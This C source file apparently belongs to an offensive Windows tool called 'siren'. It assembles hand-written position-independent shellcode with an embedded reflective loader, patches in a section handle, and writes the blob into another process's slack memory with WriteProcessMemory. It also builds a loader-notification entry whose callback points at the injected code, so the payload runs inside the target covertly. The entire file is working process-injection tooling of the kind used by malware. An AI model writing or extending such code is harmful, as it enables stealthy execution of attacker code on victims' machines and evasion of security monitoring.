/*
 * src/stub/siren_stub.c
 *
 * Stub blob builder — assembles the PIC shellcode + notify entry and
 * writes it into the target's slack space.
 *
 * The PIC stub is hand-written x64 shellcode (siren_stub_x64.S).
 * Its bytes are linked into this translation unit via an extern array.
 * At write time we patch two fields that the stub reads at runtime:
 *   - g_section_handle_offset: where the stub reads the HANDLE value
 *   - the siren_ldr_notify_entry at the end of the blob
 *
 * Blob layout (all offsets are compile-time constants):
 *
 *   [0 .. STUB_CODE_SIZE-1]        PIC stub + embedded reflective loader
 *   [STUB_CODE_SIZE .. end-32]     padding zeros
 *   [end-32 .. end]                siren_ldr_notify_entry (32 bytes)
 */

#include "stub/siren_stub.h"
#include "notify/ldr_notify.h"  /* siren_ldr_notify_entry */

#include <string.h>

/*
 * The PIC stub shellcode is compiled from siren_stub_x64.S.
 * During the build, the assembler produces an object file that exports
 * `siren_stub_code` (byte array) and `siren_stub_code_size` (size_t).
 *
 * For the C compilation unit (this file) we declare them as extern.
 */
extern const unsigned char siren_stub_code[];
extern const size_t        siren_stub_code_size;

/*
 * Offset within siren_stub_code where the stub reads the section handle.
 * The stub stores a 64-bit placeholder (0xDEADBEEFCAFEBABE) that we
 * patch to the real HANDLE value before writing into the target.
 *
 * This offset is exported from the assembly file as a symbol.
 */
extern const size_t siren_stub_handle_patch_offset;

/* ─── Entry layout matching notify/ldr_notify.h ─────────────────── */

/* Alignment: entry starts on a 16-byte boundary after the code. */
static size_t entry_offset_calc(void)
{
    size_t code_end = siren_stub_code_size;
    /* Round up to 16-byte alignment. */
    return (code_end + 15u) & ~(size_t)15u;
}

size_t siren_stub_total_size(void)
{
    return entry_offset_calc() + sizeof(siren_ldr_notify_entry);
}

size_t siren_stub_entry_offset(void)
{
    return entry_offset_calc();
}

siren_status_t siren_stub_write(HANDLE  hProcess,
                                void   *slack_addr,
                                size_t  slack_size,
                                HANDLE  section_handle)
{
    if (!hProcess || !slack_addr || !section_handle)
        return SIREN_E_NULL_ARG;

    size_t total = siren_stub_total_size();
    if (slack_size < total)
        return SIREN_E_STUB_TOO_LARGE;

    /* ── Build blob in local buffer ──────────────────────────────── */
    unsigned char *blob = (unsigned char *)LocalAlloc(LMEM_ZEROINIT,
                                                       (UINT)total);
    if (!blob)
        return SIREN_E_STUB_TOO_LARGE;

    /* Copy PIC stub code. */
    memcpy(blob, siren_stub_code, siren_stub_code_size);

    /* Patch the section handle placeholder inside the stub code. */
    if (siren_stub_handle_patch_offset + sizeof(HANDLE) <=
        siren_stub_code_size) {
        memcpy(blob + siren_stub_handle_patch_offset,
               &section_handle, sizeof(HANDLE));
    }

    /* Build the notify entry at the end of the blob. */
    size_t entry_off = entry_offset_calc();
    siren_ldr_notify_entry *entry =
        (siren_ldr_notify_entry *)(blob + entry_off);

    /* entry->List will be patched by siren_notify_insert. */
    entry->List.Flink = NULL;
    entry->List.Blink = NULL;

    /* Callback points to the start of the blob in the target. */
    entry->Callback = slack_addr;

    /* Context = section handle (stub reads this to call NtMapViewOfSection). */
    entry->Context = (PVOID)(ULONG_PTR)section_handle;

    /* ── WriteProcessMemory into target's slack ───────────────────── */
    SIZE_T written = 0;
    BOOL ok = WriteProcessMemory(hProcess, slack_addr,
                                 blob, total, &written);
    LocalFree(blob);

    if (!ok || written != total)
        return SIREN_E_STUB_WRITE;

    return SIREN_OK;
}
